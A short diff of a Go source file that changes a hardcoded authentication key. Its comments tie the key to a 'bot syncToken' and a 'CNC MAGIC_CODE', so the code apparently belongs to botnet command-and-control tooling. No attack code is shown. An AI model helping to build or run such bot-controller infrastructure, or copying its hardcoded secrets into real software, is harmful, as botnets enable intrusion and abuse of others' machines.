@@ -68,7 +68,7 @@ var (
 // defaultAuthKey is the auth key baked in at build time by setup.py.
 // Must match bot syncToken / CNC MAGIC_CODE.
 // Can be overridden at runtime with -key flag.
-var defaultAuthKey = "4J*sgOVnQuQ@TpvT" //change me run setup.py
+var defaultAuthKey = "McDPahp5&tAo$F1y" //change me run setup.py
 
 // startTime is used to compute uptime in stats reports.
 var startTime = time.Now()
